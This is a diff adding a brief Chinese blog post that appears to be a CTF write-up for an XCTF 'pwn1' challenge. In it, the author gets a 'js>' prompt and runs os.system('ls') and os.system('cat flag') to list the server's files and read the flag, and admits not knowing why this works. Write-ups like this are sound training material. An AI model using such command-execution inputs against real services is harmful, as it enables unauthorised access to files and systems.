@@ -1,0 +1,35 @@
+---
+layout: post
+title:  pwn1
+date:   2020-09-29 00:01:01 +0300
+image:  2020-09-29-mountain.jpg
+tags:   [ctf,pwn,XCTF]
+---
+
+这道题就离谱
+
+交互界面
+
+```assembly
+js>
+```
+
+输入os.system("ls")
+
+```assembly
+bin
+dev
+flag
+js
+lib
+lib32
+lib64
+libnspr4.so
+libplc4.so
+libplds4.so
+run.sh
+```
+
+os.system("cat flag")得到flag
+
+具体什么原理还不是很清楚。。。。。。。。。。。。。
